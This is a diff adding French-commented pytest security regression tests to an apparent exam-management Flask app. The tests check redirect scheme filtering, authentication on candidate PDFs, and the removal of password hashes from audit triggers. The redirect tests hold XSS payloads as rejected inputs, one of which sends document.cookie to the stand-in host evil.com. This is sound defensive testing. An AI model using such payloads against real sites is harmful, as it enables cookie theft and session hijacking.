@@ -293,6 +293,125 @@ class TestSecretRedactionInLogs:
 
 # ── #8 — Fiabilité de la chaîne de hash des logs d'audit ──────────────────────
 
+# ── #9 — _safe_redirect_url rejette les schémas dangereux ────────────────────
+
+class TestSafeRedirectUrl:
+    """Vuln audit : `_safe_redirect_url` ne vérifiait que `netloc`, laissant
+    passer `javascript:` et `data:` (netloc vide). La correction ajoute un
+    allowlist de schémas (`http`, `https`, chemin relatif)."""
+
+    def _check(self, flask_app, url):
+        from app import _safe_redirect_url
+        with flask_app.test_request_context("/", headers={"Host": "localhost"}):
+            return _safe_redirect_url(url)
+
+    def test_javascript_uri_rejected(self, flask_app):
+        assert self._check(flask_app, "javascript:alert(1)") is None
+
+    def test_javascript_uri_with_payload_rejected(self, flask_app):
+        assert self._check(flask_app, "javascript:fetch('https://evil.com?c='+document.cookie)") is None
+
+    def test_data_uri_rejected(self, flask_app):
+        assert self._check(flask_app, "data:text/html,<script>alert(1)</script>") is None
+
+    def test_vbscript_uri_rejected(self, flask_app):
+        assert self._check(flask_app, "vbscript:msgbox(1)") is None
+
+    def test_relative_path_accepted(self, flask_app):
+        assert self._check(flask_app, "/gestion") == "/gestion"
+
+    def test_same_host_http_accepted(self, flask_app):
+        assert self._check(flask_app, "http://localhost/gestion") == "http://localhost/gestion"
+
+    def test_external_host_rejected(self, flask_app):
+        assert self._check(flask_app, "https://evil.com/steal") is None
+
+    def test_none_and_empty_return_none(self, flask_app):
+        assert self._check(flask_app, None) is None
+        assert self._check(flask_app, "") is None
+        assert self._check(flask_app, "None") is None
+
+
+# ── #10 — PDFs candidats protégés par authentification ────────────────────────
+
+class TestCandidatPdfAccessControl:
+    """Vuln audit : la route `/download` servait les fichiers `candidat_*.pdf`
+    sans aucune authentification. Ces PDFs contiennent le nom, l'INE, le
+    planning d'oraux et les identifiants de connexion du candidat."""
+
+    def test_candidat_pdf_denied_without_session(self, client):
+        r = client.get("/download?filename=candidat_Martin_Paul.pdf",
+                       follow_redirects=False)
+        assert r.status_code == 403
+
+    def test_candidat_pdf_accessible_with_admin_session(self, admin_client):
+        r = admin_client.get("/download?filename=candidat_Martin_Paul.pdf",
+                             follow_redirects=False)
+        # Le fichier n'existe pas en test → 404, mais PAS 403
+        assert r.status_code != 403
+
+    def test_candidat_pdf_accessible_with_candidat_session(self, client, flask_app):
+        with client.session_transaction() as sess:
+            sess["candidat"] = "111111111AA"
+        r = client.get("/download?filename=candidat_Martin_Paul.pdf",
+                       follow_redirects=False)
+        assert r.status_code != 403
+
+    def test_candidat_pdf_accessible_with_examinateur_session(self, client, db_mock):
+        db_mock.make_sql_select.return_value = [{"nom": "Martin", "password_hash": "x",
+                                                  "salle": "101"}]
+        with client.session_transaction() as sess:
+            sess["user"] = "101"
+        r = client.get("/download?filename=candidat_Martin_Paul.pdf",
+                       follow_redirects=False)
+        assert r.status_code != 403
+
+    def test_papillons_pdf_still_requires_admin(self, client):
+        r = client.get("/download?filename=papillons_candidats.pdf",
+                       follow_redirects=False)
+        assert r.status_code == 403
+
+    def test_other_pdf_still_requires_authentication(self, client):
+        r = client.get("/download?filename=liste_oraux.pdf",
+                       follow_redirects=False)
+        # Sans session → redirect vers login (302) ou 403, jamais 200
+        assert r.status_code in (302, 403)
+
+
+# ── #11 — Triggers DB sans password_hash ─────────────────────────────────────
+
+class TestTriggerNoPasswordHash:
+    """Vuln audit : les triggers INSERT/UPDATE/DELETE sur la table Examinateur
+    incluaient `password_hash` dans le JSON loggé vers la table Logs. Ce hash
+    scrypt se retrouvait ensuite dans l'archive RGPD (journal_audit.json),
+    en contradiction avec la politique déclarée d'exclusion des mots de passe."""
+
+    @pytest.fixture(scope="class")
+    def trigger_sql(self):
+        source = (Path(__file__).resolve().parents[2]
+                  / "db_facility_save.py").read_text(encoding="utf-8")
+        # Extraire uniquement les blocs de triggers Examinateur
+        import re
+        return "\n".join(
+            m.group(0)
+            for m in re.finditer(
+                r'CREATE TRIGGER (after_insert_Examinateur|after_update_Examinateur'
+                r'|after_delete_Examinateur).*?END',
+                source, re.DOTALL,
+            )
+        )
+
+    def test_insert_trigger_has_no_password_hash(self, trigger_sql):
+        assert "password_hash" not in trigger_sql, (
+            "Les triggers Examinateur ne doivent pas logger password_hash "
+            "(présent dans l'archive RGPD via journal_audit.json)"
+        )
+
+    def test_triggers_still_log_essential_fields(self, trigger_sql):
+        for field in ("nom", "salle", "loge", "matiere"):
+            assert field in trigger_sql, f"Le champ '{field}' doit rester dans les triggers"
+
+
 ROOT_DIR = APP_PY.resolve().parents[1]
 DB_FACILITY_SAVE_PY = ROOT_DIR / "db_facility_save.py"
 
